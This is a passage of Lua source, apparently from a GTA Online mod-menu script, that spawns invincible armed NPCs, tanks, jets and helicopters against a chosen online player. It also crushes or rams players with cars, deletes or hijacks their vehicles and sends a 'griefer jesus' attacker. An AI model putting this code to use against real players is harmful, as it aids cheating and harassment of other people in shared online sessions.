    local outHeading = memory.alloc(4)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local driver = entities.create_ped(5, pedHash, offset, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        AUDIO.STOP_PED_SPEAKING(driver, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_PED_COMBAT_RANGE(driver, 2)
        PED.SET_PED_SEEING_RANGE(driver, 1000.0)
        PED.SET_PED_SHOOT_RATE(driver, 1000)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.SET_DRIVE_TASK_DRIVING_STYLE(driver, 786468)

        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setGodmode)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        VEHICLE.SET_VEHICLE_MOD(vehicle, 10, weaponModId, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        local blip = add_blip_for_entity(vehicle, 742, 4)

        util.create_tick_handler(function()
            local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
            local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if not ENTITY.DOES_ENTITY_EXIST(vehicle) or ENTITY.IS_ENTITY_DEAD(vehicle, false) or
            not ENTITY.DOES_ENTITY_EXIST(driver) or PED.IS_PED_INJURED(driver) then
                return false

            elseif not PED.IS_PED_IN_COMBAT(driver, target) and not PED.IS_PED_INJURED(target) then
                TASK.CLEAR_PED_TASKS(driver)
                TASK.TASK_COMBAT_PED(driver, target, 0, 16)
                PED.SET_PED_KEEP_TASK(driver, true)

            elseif not is_player_active(targetId, false, true) or
            players.get_position(targetId):distance(vehPos) > 1000.0 then
                TASK.CLEAR_PED_TASKS(driver)
                PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, false)
                TASK.TASK_VEHICLE_DRIVE_WANDER(driver, vehicle, 10.0, 786603)
                PED.SET_PED_KEEP_TASK(driver, true)
                remove_decor(vehicle)
                util.remove_blip(blip)
                local pVehicle = memory.alloc_int()
                memory.write_int(pVehicle, vehicle)
                ENTITY.SET_VEHICLE_AS_NO_LONGER_NEEDED(pVehicle)
                return false
            end
        end)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end

---@param targetId integer
local function spawn_buzzard(targetId)
    local vehicleHash <const> = util.joaat("buzzard")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash);	request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local playerRelGroup = PED.GET_PED_RELATIONSHIP_GROUP_HASH(target)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), playerRelGroup)
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, playerRelGroup, util.joaat("ARMY"))
    PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))

    local pos = players.get_position(targetId)
    local heli = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(heli) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(heli), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(heli, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(heli), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(heli, true, 1)
        set_decor_flag(heli, DecorFlag_isEnemyVehicle)
        local pos = get_random_offset_from_entity(target, 20.0, 40.0)
        pos.z = pos.z + 20.0
        ENTITY.SET_ENTITY_COORDS(heli, pos.x, pos.y, pos.z, false, false, false, false)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(heli), false)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, setGodmode)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        local blip = add_blip_for_entity(heli, 422, 4)
        set_blip_name(blip, "buzzard2", true)

        local pilot = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
        PED.SET_PED_MAX_HEALTH(pilot, 500)
        ENTITY.SET_ENTITY_HEALTH(pilot, 500, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(pilot, setGodmode)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
        PED.SET_PED_KEEP_TASK(pilot, true)
        TASK.TASK_HELI_MISSION(pilot, heli, 0, target, 0.0, 0.0, 0.0, 23, 40.0, 40.0, -1.0, 0, 10, -1.0, 0)

        for seat = 1, 2 do
            local ped = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(ped, heli, seat)
            WEAPON.GIVE_WEAPON_TO_PED(ped, gunnerWeapon, -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)
            PED.SET_PED_MAX_HEALTH(ped, 500)
            ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(ped, setGodmode)
            PED.SET_PED_SHOOT_RATE(ped, 1000)
            PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, util.joaat("ARMY"))
            TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(ped, 200.0, 0)
        end
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
end

---@param targetId integer
local function spawn_lazer(targetId)
    local jetHash <const> = util.joaat("lazer")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(jetHash); request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = players.get_position(targetId)
    local jet = entities.create_vehicle(jetHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(jet) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(jet), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(jet, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(jet), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(jet, true, 1)
        set_decor_flag(jet, DecorFlag_isEnemyVehicle)
        local pos = get_random_offset_from_entity(jet, 30.0, 80.0)
        pos.z = pos.z + 500.0
        ENTITY.SET_ENTITY_COORDS(jet, pos.x, pos.y, pos.z, false, false, false, false)
        set_entity_face_entity(jet, target, false)
        local blip = add_blip_for_entity(jet, 16, 4)
        set_blip_name(blip, "blip_4xz66m0", true) -- random collision for 0x2257C97F
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        ENTITY.SET_ENTITY_INVINCIBLE(jet, setGodmode)
        VEHICLE.SET_VEHICLE_FORCE_AFTERBURNER(jet, true)

        local pilot = entities.create_ped(5, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pilot, false, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target, 0.0, 0.0, 0.0, 6, 100.0, 0.0, 0.0, 80.0, 50.0, 0)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, 60.0)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(jetHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end

function veh_attacker_spawn(pid, index, option)
    local i = 0
    while i < count and players.exists(pid) do
        if option == "Minitank" then
            spawn_minitank(pid)
        elseif option == "Lazer" then
            spawn_lazer(pid)
        elseif option == "Buzzard" then spawn_buzzard(pid) end
        i = i + 1
        util.yield(150)
    end
end

local minitankModIds <const> =
{
    stockWeapon = -1,
    plasmaCannon = 1,
    rocket = 2,
}

function mintank_weapon(index)
    if index == 1 then
        weaponModId = minitankModIds.stockWeapon
    elseif index == 2 then
        weaponModId = minitankModIds.plasmaCannon
    elseif index == 3 then
        weaponModId = minitankModIds.rocket
    end
end

local gunnerWeapons <const> = {"weapon_mg", "weapon_rpg"}
function gunner_weapon(index)
    gunnerWeapon = util.joaat(gunnerWeapons[index])
end

function veh_attacker_spawn_count(value)
    count = value 
end

function veh_attacker_spawn_god(toggle)
    setGodmode = toggle
end

local deleteVehiclePassengers = function(vehicle)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) -1 do
        if VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, seat, false) then
            continue
        end
        local passenger = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
        if request_control(passenger, 1000) then entities.delete_by_handle(passenger) end
    end
end

function dele_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isEnemyVehicle) and request_control(vehicle, 1000) then
            deleteVehiclePassengers(vehicle)
            entities.delete_by_handle(vehicle)
        end
    end
end

function heavy_weapon(pid)
    local hash <const> = util.joaat("weapon_heavysniper")
    local camPos = CAM.GET_GAMEPLAY_CAM_COORD()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(camPos.x, camPos.y, camPos.z, pos.x, pos.y, pos.z, 200, false, hash, players.user_ped(), true, false, -1.0)
end

function firework_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_firework")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end

function raypisol_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_raypistol")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end

function fire_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_molotov")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end

function emp_weapon(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
    local hash <const> = util.joaat("weapon_emplauncher")
    request_weapon_asset(hash)
    WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
end


function SmashCar(Veh_h, tar1,  invis_aveh, rate)
    local  CC = VEHICLE.CREATE_VEHICLE(Veh_h, tar1.x, tar1.y, tar1.z + 5.0, 0, true, true, false)
    if invis_aveh then
     ENTITY.SET_ENTITY_VISIBLE(CC, false, 0)
 end
     ENTITY.SET_ENTITY_INVINCIBLE(CC, true)
     ENTITY.SET_ENTITY_VELOCITY(CC, 0, 0, -1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(CC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(CC, true)
     util.yield(rate)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(CC)
     entities.delete_by_handle(CC)
 end
 
 function RamCar(Veh_h, tar1x, tar1y, tar1z, invis_aveh, targets, rate)
     local RC = VEHICLE.CREATE_VEHICLE(Veh_h, tar1x, tar1y, tar1z, 0, true, true, false)
     if invis_aveh then
         ENTITY.SET_ENTITY_VISIBLE(RC, false, 0)
     end
     PFP(RC, targets)
     ENTITY.SET_ENTITY_INVINCIBLE(RC, true)
     VEHICLE.SET_VEHICLE_FORWARD_SPEED(RC, 1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(RC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(RC, true)
     util.yield(rate)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(RC)
     entities.delete_by_handle(RC)
 end

vehaset = {invis_aveh = false, vehasel = util.joaat('speedo2') , vehra = 1000}
function vehpushandhit(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    local UV = ENTITY.GET_ENTITY_UPRIGHT_VALUE(targets)
    Delcar(targets)
    Streament(vehaset.vehasel)
    if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        SmashCar(vehaset.vehasel, tar1, vehaset.invis_aveh, vehaset.vehra)
        if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
            if set.alert then
                util.toast(pname..  '被粉碎了')
            end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end


        else
            if set.alert then
                util.toast('无法攻击 ' ..pname)
            end

        end
        end
        end
        end
        end
        end
        end
        end
        end
    end
    if not players.exists(pid) then
        if set.alert then
            util.toast('你让他们怒不可遏')
        end
        util.stop_thread()
    end
end

function vehhitcantsee(on)
    vehaset.invis_aveh = on
end

function deleplayercar(pid)
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
    if not PED.IS_PED_IN_ANY_VEHICLE(player, true) then
        util.toast("玩家不在载具里. :/")
        return
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
    util.yield(500)
    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(player_veh) then
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(player_veh, false, false)
        entities.delete_by_handle(player_veh)
    else
        util.toast("无法控制此玩家载具. :/")
    end
end


function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model_load(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    end
end

function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    min = memory.read_vector3(minptr)
    max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])

    memory.free(minptr)
    memory.free(maxptr)

    return size
end

function changemodel(pid)
give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)
end

function tpcartomv1(pid, coord)
    local name = PLAYER.GET_PLAYER_NAME(pid)
    if robustmode then
        menu.trigger_commands("spectate" .. name .. " on")
        util.yield(1000)
    end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(car) then
            for i=1, 3 do
                util.toast("OK")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
            end
        end
    end
end

function tpcartomv2(coord)
    for k,pid in pairs(players.list(false, true, true)) do
        tpcartomv1(pid, coord)
    end
end




function kick_from_veh(pid)
    log("Kicking " .. pid .. " from vehicle.")
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pid))
end

function npc_jack(target, nearest)
    npc_jackthr = util.create_thread(function(thr)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        kick_from_veh(target)
        local st = os.time()
        while not VEHICLE.IS_VEHICLE_SEAT_FREE(last_veh, -1) do
            if os.time() - st >= 10 then
                util.toast("未能在10秒内释放汽车座椅")
                util.stop_thread()
            end
            util.yield()
        end
        local hash = 0x9C9EFFD8
        request_model_load(hash)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, -2.0, 0.0, 0.0)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local ped = entities.create_ped(28, hash, coords, 30.0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        PED.SET_PED_INTO_VEHICLE(ped, last_veh, -1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(last_veh, true, true, false)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped, last_veh, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 786996, 5, 0)
        util.toast("Vehicle jack complete!")
        util.stop_thread()
    end)
end

function is_ped_player(ped)
    if PED.GET_PED_TYPE(ped) >= 4 then
        return false
    else
        return true
    end
end


vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false

function mod_uses(type, incr)
    if incr < 0 and is_loading then
        --util.log("不增加使用类型的 var " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    --util.log("递增使用 var 类型 " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

local givegun = false
num_attackers = 1
function send_attacker(hash, pid, givegun)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(hash)
    for i=1, num_attackers do
        local attacker = entities.create_ped(28, hash, coords, math.random(0, 270))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(attacker, true)
        end
        TASK.TASK_COMBAT_PED(attacker, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(attacker, 100.0)
        PED.SET_PED_COMBAT_ABILITY(attacker, 2)
        PED.SET_PED_AS_ENEMY(attacker, true)
        PED.SET_PED_FLEE_ATTRIBUTES(attacker, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)
        if givegun then
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atkgun, 0, false, true)
        end
    end
end

function dispatch_griefer_jesus(target)
    log("Dispatched griefer jesus.")
    griefer_jesus = util.create_thread(function(thr)
        util.toast("Griefer jesus sent!")
        request_model_load(-835930287)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local jesus = entities.create_ped(1, -835930287, coords, 90.0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus, true)
        PED.SET_PED_HEARING_RANGE(jesus, 9999)
	    PED.SET_PED_CONFIG_FLAG(jesus, 281, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 5, true)
	    PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 46, true)
        PED.SET_PED_CAN_RAGDOLL(jesus, false)
        WEAPON.GIVE_WEAPON_TO_PED(jesus, util.joaat("WEAPON_RAILGUN"), 9999, true, true)
        TASK.TASK_GO_TO_ENTITY(jesus, target_ped, -1, -1, 100.0, 0.0, 0)
    	TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(jesus, 100.0)
        PED.SET_PED_COMBAT_ABILITY(jesus, 2)
        while true do
            local player_coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
            local jesus_coords = ENTITY.GET_ENTITY_COORDS(jesus, false)
            local dist =  MISC.GET_DISTANCE_BETWEEN_COORDS(player_coords['x'], player_coords['y'], player_coords['z'], jesus_coords['x'], jesus_coords['y'], jesus_coords['z'], false)
            if dist > 100 then
                local behind = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, -3.0, 0.0, 0.0)
                ENTITY.SET_ENTITY_COORDS(jesus, behind['x'], behind['y'], behind['z'], false, false, false, false)
            end
            if not ENTITY.DOES_ENTITY_EXIST(jesus) then
                util.toast("Jesus apparently stopped existing. Stopping Jesus thread.")
                util.stop_thread()
            end
            local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            if not players.exists(target) then
                util.toast("The player target has been lost. The griefer Jesus thread is stopping.")
                util.stop_thread()
            else
                TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
            end
            util.yield()
        end
    end)
end

function send_aircraft_attacker(vhash, phash, pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(vhash)
    request_model_load(phash)
    for i=1, num_attackers do
        coords.x = coords.x + i*2
        coords.y = coords.y + i*2
        local aircraft = entities.create_vehicle(vhash, coords, 0.0)
        VEHICLE.CONTROL_LANDING_GEAR(aircraft, 3)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(aircraft, true)
        end
        for i= -1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
            local ped = entities.create_ped(28, phash, coords, 30.0)
            if i == -1 then
                TASK.TASK_PLANE_MISSION(ped, aircraft, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
            end
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            PED.SET_PED_INTO_VEHICLE(ped, aircraft, i)
            TASK.TASK_COMBAT_PED(ped, target_ped, 0, 16)
            PED.SET_PED_ACCURACY(ped, 100.0)
            PED.SET_PED_COMBAT_ABILITY(ped, 2)
        end
    end
end

function max_out_car(veh)
    for i=0, 49 do
        num = VEHICLE.GET_NUM_VEHICLE_MODS(veh, i)
        VEHICLE.SET_VEHICLE_MOD(veh, i, num -1, true)
    end
end

function send_groundv_attacker(vhash, phash, pid, givegun)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    request_model_load(vhash)
    local bike_hash = -159126838
    request_model_load(phash)
    for i=1, num_attackers do
        local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, num_attackers-i, -10.0, 0.0)
        spawn_pos.x = spawn_pos['x']
        spawn_pos.y = spawn_pos['y']
        spawn_pos.z = spawn_pos['z']
        local bike = entities.create_vehicle(vhash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
        for i=-1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
            local rider = entities.create_ped(1, phash, spawn_pos, 0.0)
            if i == -1 then
                TASK.TASK_VEHICLE_CHASE(rider, target_ped)
            end
            max_out_car(atkbike)
            PED.SET_PED_INTO_VEHICLE(rider, bike, i)
            WEAPON.GIVE_WEAPON_TO_PED(rider, atkgun, 1000, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(rider, 5, true)
